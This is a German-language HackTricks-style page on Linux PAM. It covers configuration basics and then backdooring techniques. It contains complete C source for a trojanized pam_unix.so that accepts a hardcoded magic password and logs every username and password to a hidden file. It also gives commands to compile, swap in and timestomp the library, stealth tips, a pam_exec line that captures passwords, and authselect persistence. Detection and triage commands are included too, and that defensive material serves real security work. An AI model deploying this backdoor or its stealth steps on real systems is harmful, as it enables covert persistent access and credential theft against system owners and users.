# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Grundlegende Informationen

**PAM (Pluggable Authentication Modules)** fungiert als Sicherheitsmechanismus, der **die Identität von Benutzern überprüft, die versuchen, auf Computerdienste zuzugreifen**, und ihren Zugriff anhand verschiedener Kriterien kontrolliert. Es ist vergleichbar mit einem digitalen Türsteher, der sicherstellt, dass nur autorisierte Benutzer bestimmte Dienste nutzen können, während ihre Nutzung möglicherweise eingeschränkt wird, um eine Überlastung des Systems zu verhindern.

#### Konfigurationsdateien

- **Solaris- und UNIX-basierte Systeme** verwenden typischerweise eine zentrale Konfigurationsdatei unter `/etc/pam.conf`.
- **Linux-Systeme** bevorzugen einen Verzeichnisansatz und speichern dienstspezifische Konfigurationen in `/etc/pam.d`. Die Konfigurationsdatei für den login-Dienst befindet sich beispielsweise unter `/etc/pam.d/login`.

Ein Beispiel für eine PAM-Konfiguration für den login-Dienst könnte wie folgt aussehen:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM-Verwaltungsbereiche**

Diese Bereiche oder Verwaltungsgruppen umfassen **auth**, **account**, **password** und **session**. Jeder ist für unterschiedliche Aspekte des Authentifizierungs- und Sitzungsverwaltungsprozesses zuständig:

- **Auth**: Validiert die Identität des Benutzers, häufig durch Abfrage eines Passworts.
- **Account**: Übernimmt die Kontenüberprüfung und prüft Bedingungen wie Gruppenmitgliedschaft oder zeitabhängige Einschränkungen.
- **Password**: Verwaltet Passwortaktualisierungen, einschließlich Komplexitätsprüfungen oder der Verhinderung von Dictionary-Angriffen.
- **Session**: Verwaltet Aktionen beim Start oder Ende einer Service-Sitzung, etwa das Einhängen von Verzeichnissen oder das Festlegen von Ressourcenlimits.

#### **PAM-Modulsteuerungen**

Steuerungen legen fest, wie das Modul auf Erfolg oder Fehlschlag reagiert, und beeinflussen den gesamten Authentifizierungsprozess. Dazu gehören:

- **Required**: Der Fehlschlag eines erforderlichen Moduls führt letztendlich zu einem Fehlschlag, jedoch erst, nachdem alle nachfolgenden Module geprüft wurden.
- **Requisite**: Sofortige Beendigung des Prozesses bei einem Fehlschlag.
- **Sufficient**: Ein Erfolg überspringt die verbleibenden Prüfungen desselben Bereichs, sofern ein nachfolgendes Modul nicht fehlschlägt.
- **Optional**: Führt nur dann zu einem Fehlschlag, wenn es das einzige Modul im Stack ist.

#### Relevante offensive Semantik

Beim Backdooring von PAM ist die **Position der eingefügten Regel** oft wichtiger als die Payload selbst:

- `include` und `substack` beziehen Regeln aus anderen Dateien ein. Das Bearbeiten von `sshd` betrifft daher möglicherweise nur SSH, während das Bearbeiten von `system-auth`, `common-auth` oder eines anderen gemeinsam verwendeten Stacks mehrere Services gleichzeitig beeinflusst.
- PAM unterstützt außerdem Steuerungen in eckigen Klammern wie `[success=1 default=ignore]`. Diese können missbraucht werden, um nach einer erfolgreichen benutzerdefinierten Prüfung ein oder mehrere Module zu **überspringen**, anstatt `pam_unix.so` sichtbar zu ersetzen.
- Der `module-path` kann **absolut** sein (`/usr/lib/security/pam_custom.so`) oder relativ zum standardmäßigen PAM-Modulverzeichnis. Auf modernen Linux-Systemen sind die tatsächlichen Verzeichnisse häufig `/lib/security`, `/lib64/security`, `/usr/lib/security` oder Multiarch-Pfade wie `/usr/lib/x86_64-linux-gnu/security`.

Kurze operator-orientierte Erkenntnis: Vor dem Patchen immer den **vollständigen Service-Graphen** abbilden. Beispielsweise bedeutet `sshd -> password-auth -> system-auth` auf einigen Distros oder `sshd -> system-remote-login -> system-login -> system-auth` auf anderen, dass sich dasselbe einzeilige Implantat möglicherweise wesentlich weiter ausbreitet als beabsichtigt.

#### Beispielszenario

In einer Konfiguration mit mehreren Auth-Modulen folgt der Prozess einer strikt festgelegten Reihenfolge. Wenn das Modul `pam_securetty` feststellt, dass das Login-Terminal nicht autorisiert ist, werden Root-Logins blockiert, dennoch werden aufgrund seines Status "required" weiterhin alle Module verarbeitet. `pam_env` setzt Umgebungsvariablen, was möglicherweise die Benutzerfreundlichkeit verbessert. Die Module `pam_ldap` und `pam_unix` arbeiten zusammen, um den Benutzer zu authentifizieren, wobei `pam_unix` versucht, ein zuvor übermitteltes Passwort zu verwenden, was die Effizienz und Flexibilität der Authentifizierungsmethoden erhöht.


## Backdooring von PAM – Hooking von `pam_unix.so`

Ein klassischer Persistence-Trick in hochwertigen Linux-Umgebungen besteht darin, die legitime PAM-Bibliothek durch einen trojanisierten **Drop-in** zu ersetzen. Da jeder SSH- oder Konsolen-Login letztendlich `pam_unix.so:pam_sm_authenticate()` aufruft, reichen wenige Zeilen C aus, um Credentials abzugreifen oder einen *magischen* Passwort-Bypass zu implementieren.

### Compilation Cheatsheet
<details>
<summary>Beispiel für ein `pam_unix.so`-Trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Kompilieren und unauffällig ersetzen:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec-Tipps
1. **Atomisches Überschreiben** – in eine temporäre Datei schreiben und sie per `mv` an die vorgesehene Stelle verschieben, um halb geschriebene Bibliotheken zu vermeiden, die SSH aussperren würden.
2. Die Platzierung von Logdateien wie `/usr/bin/.dbus.log` fügt sich in legitime Desktop-Artefakte ein.
3. Symbol-Exporte identisch halten (`pam_sm_setcred` usw.), um Fehlverhalten von PAM zu vermeiden.

### Erkennung
* MD5/SHA256 von `pam_unix.so` mit dem Paket der Distribution vergleichen.
* `rpm -V pam` oder `debsums -s libpam-modules` verwenden, um ersetzte Bibliotheken ohne manuelles Hashing zu erkennen.
* Auf weltweit beschreibbare Dateien oder ungewöhnliche Eigentümer unter `/lib/security/` prüfen.
* `auditd`-Regel: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* PAM-Konfigurationen mit `grep` auf unerwartete Module prüfen: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Schnelle Triage-Befehle (nach einer Kompromittierung oder bei der Threat-Suche)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### `pam_exec` für Persistenz missbrauchen
Anstatt `pam_unix.so` zu ersetzen, ist es weniger invasiv, eine `pam_exec`-Zeile in `/etc/pam.d/sshd` anzuhängen, sodass jede SSH-Anmeldung ein Implantat startet, während der normale Stack intakt bleibt:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` erhält PAM-Metadaten in Umgebungsvariablen wie `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` und `PAM_TYPE`. Mit `expose_authtok` kann der Helper das Passwort während der `auth`- oder `password`-Phasen auch aus `stdin` lesen. Wenn der Helper mit der effektiven UID statt mit der realen UID ausgeführt werden soll, füge `seteuid` hinzu.

Praktische Hinweise:

- `session optional pam_exec.so ...` eignet sich besser für **post-login actions** wie das erneute Öffnen von Sockets oder das Starten eines losgelösten Daemons.
- `auth optional pam_exec.so quiet expose_authtok ...` ist die übliche Wahl für **credential capture**, da es ausgeführt wird, bevor die Session geöffnet wird.
- `type=session` oder `type=auth` kann verwendet werden, um die Ausführung auf eine bestimmte PAM-Phase zu beschränken und störende doppelte Ausführungen zu vermeiden.

### Distributionstools überleben: `authselect`

Auf RHEL, CentOS Stream, Fedora und davon abgeleiteten Systemen können direkte Änderungen an generierten Dateien wie `/etc/pam.d/system-auth` oder `/etc/pam.d/password-auth` von `authselect` **überschrieben werden**. Für dauerhafte Änderungen patchen Operatoren häufig das aktive Custom-Profil unter `/etc/authselect/custom/<profile>/` und wählen es anschließend erneut aus oder wenden es an.

Typischer Ablauf, wenn du root hast:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Das ist sowohl für offensive Aktivitäten als auch für die Triage relevant: Wenn `/etc/pam.d/system-auth` das Banner `Generated by authselect` und `Do not modify this file manually` enthält, kann der tatsächliche Persistenzpunkt unter `/etc/authselect/custom/` statt unter `/etc/pam.d/` liegen.

### Aktuelle Tradecraft in freier Wildbahn

Aktuelle Berichte aus dem Jahr 2025 über die Linux-Backdoor **Plague** zeigten, dass dieselbe Kernidee weiterentwickelt wurde: eine bösartige PAM-Komponente mit einem **statischen Bypass-Passwort** sowie das Bereinigen von SSH-bezogenen Umgebungsvariablen und der Shell-History (`HISTFILE=/dev/null`), um nach dem Login weniger Sitzungsspuren zu hinterlassen. Das ist ein nützliches Hunting-Muster, da sich die Backdoor-Logik in PAM befinden kann, während die Stealth-Artefakte erst **nach** erfolgreicher Authentifizierung sichtbar werden.


## Referenzen

- [pam.conf(5) / pam.d(5) - Linux-PAM-Handbuch](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: Eine neu entdeckte PAM-basierte Backdoor für Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
